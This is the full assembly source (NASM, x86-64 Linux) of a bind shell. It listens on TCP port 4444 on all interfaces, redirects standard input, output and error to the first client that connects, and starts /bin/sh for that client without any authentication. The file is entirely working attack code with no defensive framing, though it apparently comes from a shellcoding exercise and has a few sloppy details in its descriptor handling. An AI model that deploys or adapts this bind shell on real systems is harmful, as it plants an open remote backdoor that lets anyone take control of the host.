global _start

;; Listens on port 4444 by default

%define INADDR_ANY 0
%define STDIN 0
%define STDOUT 1
%define WRITE 1
%define SOCK_STREAM 1
%define STDERR 2
%define AF_INET 2
%define CLOSE 3
%define BACKLOG 5
%define DUP2 33
%define SOCKET 41
%define ACCEPT 43
%define BIND 49
%define LISTEN 50
%define FORK 57
%define EXECVE 59
%define EXIT 60
%define WAIT 61
%define PORT 23569	; 4444 in network byte order

struc sockaddrin
	sin_family: resw 1
	sin_port: resw 4
	sin_addr: resw 8
endstruc

%macro write 3
	mov rax, WRITE
	mov rdi, %1
	mov rsi, %2
	mov rdx, %3
	syscall
%endmacro

%macro close 1
	mov rax, CLOSE
	mov rdi, %1
	syscall
%endmacro

%macro exit 1 
	close sockfd
	close csockfd
	mov rax, EXIT
	mov rdi, %1
	syscall
%endmacro

section .data
	struct:
		istruc sockaddrin
			at sin_family, dw AF_INET
			at sin_port, dw PORT
			at sin_addr, dw INADDR_ANY
		iend
	structsize: equ $-struct
	startmsg: db "Starting the bind-shell...", 0x0a
	startmsglen: equ $-startmsg
	errormsg: db "An error occured!", 0x0a
	errormsglen: equ $-errormsg
	listenmsg: db "Listening...", 0x0a
	listenmsglen: equ $-listenmsg
	acceptmsg: db "Waiting for a new client...", 0x0a
	acceptmsglen: equ $-acceptmsg
	shell: db "/bin/sh", 0x00
	argv0: db "/bin/sh", 0x00
	argv: dq argv0, 0x00

section .bss
	sockfd: resq 1
	csockfd: resq 1
	client_struct: resb structsize
	clientsize: resq 1

section .text
error:
	write STDOUT, errormsg, errormsglen
	close sockfd
	close csockfd
	exit 1

launchshell:
	;; execve()
	mov rax, EXECVE
	mov rdi, shell
	mov rsi, argv
	mov rdx, 0
	syscall

_wait:
	;; wait()
	mov rdi, rax
	mov rax, WAIT
	mov rsi, 0
	mov rdx, 0
	mov r10, 0
	syscall
	jmp quit
	
_start:
	;; socket()
	write STDOUT, startmsg, startmsglen
	mov rax, SOCKET
	mov rdi, AF_INET
	mov rsi, SOCK_STREAM
	mov rdx, 0
	syscall
	cmp rax, 0
	jl error
	mov [sockfd], rax

	;; bind()
	mov rax, BIND
	mov rdi, [sockfd]
	lea rsi, [struct]
	mov rdx, structsize
	syscall
	cmp rax, 0
	jne error

	;; listen()
	mov rax, LISTEN
	mov rdi, [sockfd]
	mov rsi, BACKLOG
	syscall
	cmp rax, 0
	jne error
	write STDOUT, listenmsg, listenmsglen

	;; accept()
	write STDOUT, acceptmsg, acceptmsglen
	mov rax, ACCEPT
	mov rdx, rdi
	mov rdi, [sockfd]
	mov rsi, client_struct
	mov rdx, clientsize
	syscall
	cmp rax, 0
	jl error
	mov [csockfd], rax

	;; dup2()
	mov rax, DUP2
	mov rdi, [csockfd]
	mov rsi, STDIN
	syscall
	mov [csockfd], rax
	mov rax, DUP2
	mov rdi, [csockfd]
	mov rsi, STDOUT
	syscall
	mov [csockfd], rax
	mov rax, DUP2
	mov rdi, [csockfd]
	mov rsi, STDERR
	syscall

	;; fork()
	mov rax, FORK
	syscall
	cmp rax, 0
	je launchshell
	jl error
	jg _wait
quit:
	close [csockfd]
	close [sockfd]
	exit 0
